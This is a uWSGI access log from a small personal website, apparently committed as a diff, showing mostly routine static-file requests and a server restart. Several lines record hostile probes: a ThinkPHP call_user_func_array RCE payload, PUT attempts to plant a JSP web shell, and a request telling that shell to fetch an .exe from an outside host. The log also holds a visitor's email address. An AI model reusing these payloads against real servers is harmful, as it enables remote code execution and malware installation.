+[pid: 840|app: 0|req: 51/79] 114.216.151.15 () {48 vars in 793 bytes} [Sat Mar 23 08:31:54 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 29/80] 114.216.151.15 () {48 vars in 761 bytes} [Sat Mar 23 08:31:54 2019] GET /static/js/main.js => generated 3260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 52/81] 114.216.151.15 () {48 vars in 793 bytes} [Sat Mar 23 08:31:55 2019] GET /static/js/easy-responsive-tabs.js => generated 6489 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 30/82] 114.216.151.15 () {48 vars in 783 bytes} [Sat Mar 23 08:31:55 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 31/83] 114.216.151.15 () {48 vars in 791 bytes} [Sat Mar 23 08:31:55 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 32/84] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:31:56 2019] GET /static/images/c1.png => generated 21632 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 53/85] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:31:56 2019] GET /static/images/c2.png => generated 21112 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 54/86] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:31:57 2019] GET /static/images/t1.jpg => generated 57504 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 55/87] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:31:57 2019] GET /static/images/t2.jpg => generated 66622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 56/88] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:31:59 2019] GET /static/images/t3.jpg => generated 29498 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 57/89] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:00 2019] GET /static/images/t4.jpg => generated 31577 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 58/90] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:02 2019] GET /static/images/g1.jpg => generated 150373 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 59/91] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:03 2019] GET /static/images/g3.jpg => generated 93835 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 60/92] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:04 2019] GET /static/images/g4.jpg => generated 61003 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 61/93] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:04 2019] GET /static/images/g2.jpg => generated 116260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 62/94] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:06 2019] GET /static/images/g5.jpg => generated 51280 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 63/95] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:07 2019] GET /static/images/g6.jpg => generated 58254 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 64/96] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:08 2019] GET /static/images/g7.jpg => generated 114672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 65/97] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:09 2019] GET /static/images/g8.jpg => generated 137648 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 66/98] 114.216.151.15 () {48 vars in 803 bytes} [Sat Mar 23 08:32:10 2019] GET /static/images/g9.jpg => generated 135997 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 67/99] 114.216.151.15 () {50 vars in 884 bytes} [Sat Mar 23 08:32:11 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 33/100] 114.216.151.15 () {50 vars in 884 bytes} [Sat Mar 23 08:32:11 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 71896 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 68/101] 114.216.151.15 () {48 vars in 805 bytes} [Sat Mar 23 08:32:12 2019] GET /static/images/g10.jpg => generated 52572 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 69/102] 114.216.151.15 () {48 vars in 805 bytes} [Sat Mar 23 08:32:14 2019] GET /static/images/g12.jpg => generated 78872 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 34/103] 114.216.151.15 () {48 vars in 805 bytes} [Sat Mar 23 08:32:14 2019] GET /static/images/g11.jpg => generated 92667 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 70/104] 114.216.151.15 () {48 vars in 833 bytes} [Sat Mar 23 08:32:15 2019] GET /static/images/contact.jpg => generated 248074 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 71/105] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 08:32:39 2019] GET / => generated 19519 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 840|app: 0|req: 72/106] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 08:32:55 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 841|app: 0|req: 35/107] 117.136.67.85 () {46 vars in 734 bytes} [Sat Mar 23 08:33:30 2019] GET / => generated 19519 bytes in 43 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 841|app: 0|req: 36/108] 117.136.67.85 () {46 vars in 734 bytes} [Sat Mar 23 08:33:43 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 840|app: 0|req: 73/109] 117.136.67.85 () {48 vars in 774 bytes} [Sat Mar 23 08:33:43 2019] GET /static/css/bootstrap.css => generated 141622 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 305 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 74/110] 117.136.67.85 () {48 vars in 780 bytes} [Sat Mar 23 08:33:44 2019] GET /static/css/font-awesome.css => generated 35134 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 303 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 37/111] 117.136.67.85 () {48 vars in 772 bytes} [Sat Mar 23 08:33:44 2019] GET /static/css/chocolat.css => generated 1951 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 75/112] 117.136.67.85 () {48 vars in 796 bytes} [Sat Mar 23 08:33:44 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 38/113] 117.136.67.85 () {48 vars in 766 bytes} [Sat Mar 23 08:33:44 2019] GET /static/css/style.css => generated 56231 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 39/114] 117.136.67.85 () {48 vars in 775 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/modernizr-2.6.2.min.js => generated 15414 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 40/115] 117.136.67.85 () {48 vars in 768 bytes} [Sat Mar 23 08:33:44 2019] GET /static/css/italic.css => generated 12217 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 41/116] 117.136.67.85 () {48 vars in 768 bytes} [Sat Mar 23 08:33:44 2019] GET /static/css/family.css => generated 3082 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 76/117] 117.136.67.85 () {48 vars in 769 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 77/118] 117.136.67.85 () {48 vars in 765 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 78/119] 117.136.67.85 () {48 vars in 753 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/move-top.js => generated 1330 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 79/120] 117.136.67.85 () {48 vars in 749 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/easing.js => generated 4758 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 42/121] 117.136.67.85 () {48 vars in 767 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 44/122] 117.136.67.85 () {48 vars in 777 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/easy-responsive-tabs.js => generated 6489 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 44/123] 117.136.67.85 () {48 vars in 745 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/main.js => generated 3260 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 80/124] 117.136.67.85 () {48 vars in 777 bytes} [Sat Mar 23 08:33:44 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 45/125] 117.136.67.85 () {48 vars in 775 bytes} [Sat Mar 23 08:33:45 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 81/126] 117.136.67.85 () {48 vars in 819 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/banner1.jpg => generated 246709 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 83/127] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/c3.png => generated 14458 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 83/128] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/c1.png => generated 21632 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 46/129] 117.136.67.85 () {48 vars in 802 bytes} [Sat Mar 23 08:33:45 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 71896 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 84/130] 117.136.67.85 () {48 vars in 805 bytes} [Sat Mar 23 08:33:45 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 47/131] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/c2.png => generated 21112 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 48/132] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/t1.jpg => generated 57504 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 49/133] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/t2.jpg => generated 66622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 87/135] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/t3.jpg => generated 29498 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 87/135] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/t4.jpg => generated 31577 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 87/136] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/g1.jpg => generated 150373 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 50/137] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/g2.jpg => generated 116260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 88/138] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/g3.jpg => generated 93835 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 51/139] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:45 2019] GET /static/images/g4.jpg => generated 61003 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 52/140] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g6.jpg => generated 58254 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 89/141] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g5.jpg => generated 51280 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 53/142] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g7.jpg => generated 114672 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 90/143] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g8.jpg => generated 137648 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 91/144] 117.136.67.85 () {48 vars in 809 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g9.jpg => generated 135997 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 92/145] 117.136.67.85 () {48 vars in 811 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g10.jpg => generated 52572 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 93/146] 117.136.67.85 () {48 vars in 811 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g11.jpg => generated 92667 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 94/147] 117.136.67.85 () {48 vars in 811 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/g12.jpg => generated 78872 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 54/148] 117.136.67.85 () {48 vars in 819 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/contact.jpg => generated 248074 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 841|app: 0|req: 55/149] 117.136.67.85 () {48 vars in 811 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/arr.png => generated 861 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 284 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 56/150] 117.136.67.85 () {48 vars in 817 bytes} [Sat Mar 23 08:33:46 2019] GET /static/images/arrows.png => generated 4243 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 57/151] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 08:35:49 2019] GET /static/images/iron.ico => generated 38078 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 95/152] 114.216.151.15 () {50 vars in 804 bytes} [Sat Mar 23 08:58:23 2019] GET / => generated 19519 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 840|app: 0|req: 96/153] 114.216.151.15 () {44 vars in 694 bytes} [Sat Mar 23 09:06:24 2019] GET /static/css/bootstrap.css.map => generated 232 bytes in 14 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 840|app: 0|req: 97/154] 114.216.151.15 () {50 vars in 804 bytes} [Sat Mar 23 09:06:28 2019] GET / => generated 19519 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 841|app: 0|req: 58/155] 114.216.151.15 () {44 vars in 694 bytes} [Sat Mar 23 09:06:28 2019] GET /static/css/bootstrap.css.map => generated 232 bytes in 11 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 840|app: 0|req: 98/156] 114.216.151.15 () {52 vars in 826 bytes} [Sat Mar 23 09:09:21 2019] GET /static/images/iron.ico => generated 38078 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 59/157] 117.136.67.85 () {46 vars in 734 bytes} [Sat Mar 23 09:23:53 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 841|app: 0|req: 60/158] 117.136.67.85 () {48 vars in 766 bytes} [Sat Mar 23 09:23:53 2019] GET /static/css/style.css => generated 56231 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 2)
+[pid: 840|app: 0|req: 99/159] 117.136.67.85 () {48 vars in 769 bytes} [Sat Mar 23 09:23:54 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 100/160] 31.184.194.85 () {44 vars in 953 bytes} [Sat Mar 23 09:50:50 2019] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 840|app: 0|req: 101/161] 31.184.194.85 () {46 vars in 767 bytes} [Sat Mar 23 09:50:52 2019] GET /index.php?s=captcha => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 840|app: 0|req: 102/162] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 10:47:59 2019] GET / => generated 19519 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 841|app: 0|req: 61/163] 114.216.151.15 () {48 vars in 823 bytes} [Sat Mar 23 10:49:25 2019] GET /static/images/right1.png => generated 1115 bytes in 7 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 103/164] 114.216.151.15 () {48 vars in 821 bytes} [Sat Mar 23 10:49:25 2019] GET /static/images/left1.png => generated 1283 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 104/165] 118.126.88.138 () {50 vars in 742 bytes} [Sat Mar 23 10:50:24 2019] PUT /FxCodeShell.jsp%20 => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 840|app: 0|req: 105/166] 118.126.88.138 () {50 vars in 738 bytes} [Sat Mar 23 10:50:31 2019] PUT /FxCodeShell.jsp/ => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 841|app: 0|req: 62/167] 118.126.88.138 () {46 vars in 848 bytes} [Sat Mar 23 10:50:32 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 840|app: 0|req: 106/168] 183.11.74.194 () {50 vars in 945 bytes} [Sat Mar 23 11:31:33 2019] GET / => generated 19519 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 841|app: 0|req: 63/169] 183.11.74.194 () {50 vars in 952 bytes} [Sat Mar 23 11:32:21 2019] GET / => generated 19519 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 841|app: 0|req: 64/170] 183.11.74.194 () {50 vars in 952 bytes} [Sat Mar 23 11:32:31 2019] GET / => generated 19519 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 2)
+[pid: 841|app: 0|req: 65/171] 142.93.155.4 () {44 vars in 545 bytes} [Sat Mar 23 11:34:18 2019] HEAD /index.php => generated 0 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (0 switches on core 1)
+[pid: 840|app: 0|req: 107/172] 142.93.155.4 () {44 vars in 571 bytes} [Sat Mar 23 11:34:19 2019] HEAD /admin/images/tango.png => generated 0 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 72 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 108/173] 114.216.151.15 () {50 vars in 948 bytes} [Sat Mar 23 11:36:18 2019] GET /?name=xinminhao&email=leecqchn%40163.com&message=12313 => generated 19519 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 840|app: 0|req: 109/174] 114.216.151.15 () {48 vars in 838 bytes} [Sat Mar 23 11:36:18 2019] GET /static/css/italic.css => generated 12217 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 3)
+[pid: 841|app: 0|req: 66/175] 114.216.151.15 () {50 vars in 884 bytes} [Sat Mar 23 11:36:18 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 1)
+[pid: 841|app: 0|req: 67/176] 114.216.151.15 () {48 vars in 829 bytes} [Sat Mar 23 11:36:19 2019] GET /static/images/close.png => generated 499 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 285 bytes (0 switches on core 3)
+[pid: 840|app: 0|req: 110/177] 114.216.151.15 () {48 vars in 825 bytes} [Sat Mar 23 11:36:19 2019] GET /static/images/arr.png => generated 861 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 284 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 68/178] 114.216.151.15 () {48 vars in 831 bytes} [Sat Mar 23 11:36:19 2019] GET /static/images/arrows.png => generated 4243 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 2)
+[pid: 841|app: 0|req: 69/179] 114.216.151.15 () {48 vars in 861 bytes} [Sat Mar 23 11:36:20 2019] GET /static/images/iron.ico => generated 38078 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 0)
+[pid: 840|app: 0|req: 111/180] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 12:55:17 2019] GET / => generated 19519 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 840|app: 0|req: 112/181] 114.216.151.15 () {58 vars in 1017 bytes} [Sat Mar 23 12:55:29 2019] POST / => generated 178 bytes in 1 msecs (HTTP/1.1 405) 3 headers in 108 bytes (1 switches on core 1)
+[pid: 840|app: 0|req: 113/182] 114.216.151.15 () {48 vars in 777 bytes} [Sat Mar 23 12:55:30 2019] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+[uWSGI] getting INI configuration from /var/www/xinminhao/uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 23 12:55:45 2019] ***
+compiled with version: 6.3.0 20170516 on 21 March 2019 13:18:56
+os: Linux-4.9.0-8-amd64 #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08)
+nodename: xinminhao
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /root/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/xinminhao/
+your processes number limit is 3898
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 2.7.13 (default, Sep 26 2018, 18:42:22)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x55ee13f31780
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 312672 bytes (305 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55ee13f31780 pid: 1401 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1401)
+spawned uWSGI worker 1 (pid: 1420, cores: 4)
+spawned uWSGI worker 2 (pid: 1421, cores: 4)
+*** Stats server enabled on 127.0.0.1:9191 fd: 11 ***
+[pid: 1421|app: 0|req: 1/1] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 12:56:04 2019] GET / => generated 19993 bytes in 39 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
